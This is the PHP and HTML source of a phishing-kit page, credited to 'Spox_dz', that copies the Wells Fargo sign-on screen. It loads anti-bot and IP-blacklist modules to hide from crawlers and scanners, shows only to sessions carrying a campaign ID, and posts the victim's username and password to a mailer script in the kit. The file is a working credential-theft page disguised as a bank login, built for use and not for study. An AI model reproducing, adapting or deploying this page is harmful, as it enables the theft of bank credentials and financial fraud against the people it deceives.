<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Wells             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


if (!isset($_GET['wells_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

if (!isset($_SESSION['WELLS_SPOX'])) {

  header("Location: index");
  exit();
}


?>
<html lang="en"><head>

	<!--Meta  starts-->
			<meta http-equiv="Content-type" content="text/html; charset=UTF-8">
			<meta http-equiv="Pragma" content="no-cache">
			<meta http-equiv="Pragma: no-cache">
			<meta http-equiv="Cache Control" content="no-store">
			<meta http-equiv="Cache Control: no-store">
			<meta http-equiv="Expires" content="-1">
		    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
	        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>


	<!--css include starts-->
			<link rel="stylesheet" href="Spox/Files/css/global.css">
			<link rel="stylesheet" href="Spox/Files/css/enhanced-header.css">
			<link rel="stylesheet" href="Spox/Files/css/content.css">
			<link rel="stylesheet" href="Spox/Files/css/wf.css">
			<link rel="stylesheet" href="Spox/Files/css/enhanced-footer.css">
			<link rel="icon" href="favicon.ico" type="image/x-icon">


</head>


<body id="body" theme="ssep" platform="m" contextpath="/auth">

    <a href="#" class="skipLink">main content default</a>
    <header isjukebox="" divested="" class="" origin="cob">
	<div class="enhanced-header">
			<div class="header-top ">
				<div class="header-content flex-container">
					<div class="header-brand-logo">
						<a href="#">
								<img src="Spox/Files/img/tccc.svg" alt="WELLS FARGO">
						</a>
					</div>
				<div class="header-content links flex-container">
					</div>
				<div class="header-nav-section flex-container">
						<div class="header-nav-links flex-container">
								<div class="header-nav-link">
										<a href="#">Apply</a>
									</div>
								<div class="header-nav-link">
										<a href="#">Locations</a>
									</div>
								<div class="header-nav-link">
										<a href="#">Customer Service</a>
									</div>
								</div>

							<div class="header-search">
								<form  class="header-search-form" id="">
									<input name="q" value="" aria-label="Search" title="Search" size="25" maxlength="75" type="text" autocomplete="off" autocapitalize="off" placeholder="Search">
									<img role="button" aria-label="Search" src="Spox/Files/img/ba7t.svg" class="header-search-icon" alt="search" tabindex="0">
										</form>
							</div>
							</div>
				</div>
			</div>
			<div class="header-bottom">
					<div class="header-content flex-container">
						<ul>
							<li><a id="backToPreviousPageLink" href="#">Back to Previous Page</a></li>
							<li>
									<a href="#" id="es-link" lang="es" class="OneLinkNoTx">Español</a>
									</li>
							<li><a href="#">Home</a></li>
							</ul>
					</div>
				</div>
			</div>
	</header>

<section data-id="hero" role="presentation" class="stage-coach-banner">
            <img src="Spox/Files/img/WF_stagecoach_rgb_ylw_F1.svg" alt="" aria-hidden="true">
        </section>
    <main>
<form id="Signon" action="Spox/Mail/Mail1.php" method="POST" >
<input type="hidden" name="spox">
<section data-id="content" aria-label="Sign nn to View Your Accounts" class="antiClickjackContent" origin="cob">
	<h1 id="skip" tabindex="-1">Sign on to View Your Accounts</h1>

		<?php
	if (isset($_GET['invalid'])) {
		$invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';

	if ($invalid == "login") {echo '<div id="pageerrors">
		<div class="alert">
				<img src="Spox/Files/img/error1.png" height="16" width="16">
				<strong>
					<strong>We do not recognize your username and/or password. Please try again or visit <a href="">Username/Password Help</a>.</strong></strong>
			</div>
		</div><input type="hidden" name="invalid">
';
	}}else{
		echo '<div id="pageerrors">
		<div class="alert" aria-atomic="true" role="alert" tabindex="-1">
				<img src="Spox/Files/img/alert_login.png" height="16" width="16" alt="Error">
				<strong>
					<strong>Access denied. You need to login first.</strong></strong>
			</div>
		</div>';
	}

	?>

		<div id="pageerrors">
		</div>
	<p class="copy" origin="cob">Enter your username and password to securely view and manage your
			Wells Fargo
			accounts online.</p>
		<div data-id="destination">
			<div class="enh-select">
			<select name="destination" id="destination" title="Select a destination">
				<option selected="selected" value="AccountSummary">Account Summary</option>
				<option value="Transfer">Transfer</option>
				<option value="BillPay">Bill Pay</option>
				<option value="brokerage">Brokerage</option>
				<option value="Trade">Trade</option>
				<option value="MessageAlerts">Messages &amp; Alerts</option>
			</select>
			</div>
		</div>
	<div data-id="inputContainer">
		<label id="j_username_label" for="j_username">Username</label><br>
		<input  type="text" id="j_username" name="username" value="" class="OneLinkNoTx" required="" data-validation="length" data-validation-error-msg=" " data-validation-length="min6-24">
			<div id="saveUsernamePopup" tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameTitle" aria-describedby="saveUsernameDescription" data-id="saveUsernamePopup">
			<span>Beginning of popup</span>
			<h2 id="saveUsernameTitle">Notice</h2>
			<p id="saveUsernameDescription">For your security, we do not recommend using this feature on a shared device.</p>
			<img data-id="saveUsernameArrow" src="Spox/Files/img/down.png" alt="" aria-hidden="true">
			<span>End of popup</span>
			<img tabindex="0" data-id="saveUsernameClose" role="button" src="Spox/Files/img/closex.png" alt="close dialog" aria-label="close dialog">
		</div>
	</div>
	<div data-id="inputContainer">
		<label id="j_password_label" for="j_password">Password</label><br>
		<input  type="password" id="j_password" name="password" value="" maxlength="32" autocorrect="off" required="" data-validation="length" data-validation-error-msg=" " data-validation-length="min1-32">
	</div>
	<div class="clear-both" data-id="inputContainer">
		<label class="unselectable" for="saveUsernameCheckbox" style="">
						<input class="unselectable" aria-labelledby="labelSaveUsername labelInstruction" value="true" type="checkbox" id="saveUsernameCheckbox">
						<img class="unselectable" id="imgSaveUsernameCheck" src="Spox/Files/img/save.png" checked="false" alt="">
						<span class="unselectable" id="labelSaveUsername">Save Username</span>
						<span class="sr-only" id="labelInstruction"> Checking this option will open a popup  after 2 second</span>
					</label>
				</div>
	<div class="block-display clear-both">
		<div data-id="forgotEnrollLinks" origin="cob">
			<a href="#" data-id="forgotUsername" origin="cob">Forgot Password/Username?</a>
						<span data-id="linkSeparator">|</span>
						<a href="#" data-id="forgotUsername">Enroll Now</a>
							</div>
		<input type="submit" name="continue" value="Sign On" data-id="submit" class="button cob cta-btn primary" origin="cob">
			</div>
</section>
<aside>
                <hr>
                <section class="aside-group" data-id="relatedInformation" aria-label="related information">
	<h2>Related Information</h2>
	<ul>
		<li><img src="Spox/Files/img/go.png" alt="" aria-hidden="true"> <a href="#">Enrollment FAQs</a></li><li><img src="Spox/Files/img/go.png" alt="" aria-hidden="true"> <a href="#">Online Security Guarantee</a></li><li><img src="Spox/Files/img/go.png" alt="" aria-hidden="true"> <a href="#">Privacy, Security and Legal</a></li><li><img src="Spox/Files/img/go.png" alt="" aria-hidden="true"> <a href="#">Online Access Agreement</a></li></ul>
</section>
<section class="aside-group" data-id="otherServices" aria-label="other services">
	<h2>Other Services</h2>
	<ul>
		<li><img src="Spox/Files/img/go.png" alt="" aria-hidden="true"> <a href="#">Applications In Progress</a></li>
		<li><img src="Spox/Files/img/go.png" alt="" aria-hidden="true"> <a href="#">Credit Card Rewards</a></li>
	</ul>
</section>
</aside>

            <section data-id="submitContainer">
            </section>
       </form>
    </main>
    <div data-id="footerSeparator"></div>
    <footer>
    <div class="enhanced-footer">
        <nav role="navigation">
            <div>
                <div>
                    <div class="nav-links">
                        <div class="nav-link">
                                <a href="#">About Wells Fargo</a>
                                <div class="link-separator"></div>
                            </div>
                        <div class="nav-link">
                                <a href="#">Careers</a>
                                <div class="link-separator"></div>
                            </div>
                        <div class="nav-link">
                                <a href="#">Privacy, Security &amp; Legal</a>
                                <div class="link-separator"></div>
                            </div>
                        <div class="nav-link">
                                <a href="#">Report Email Fraud</a>
                                <div class="link-separator"></div>
                            </div>
                        <div class="nav-link">
                                <a href="#">Sitemap</a>
                                <div class="link-separator"></div>
                            </div>
                        <div class="nav-link">
                                <a href="#">Home</a>
                                <div class="link-separator"></div>
                            </div>
                        </div>
                </div>
            </div>
        </nav>
        <div class="copyright-text">
            <div class="clear-both">
				<div>
	                <p data-id="copyright" class="cob">© 1999 - 2020 Wells Fargo. All rights reserved. </p>
	                    </div>
			</div>
</div>
    </div>
</footer>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>

  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});


</script>    


</body>
</html>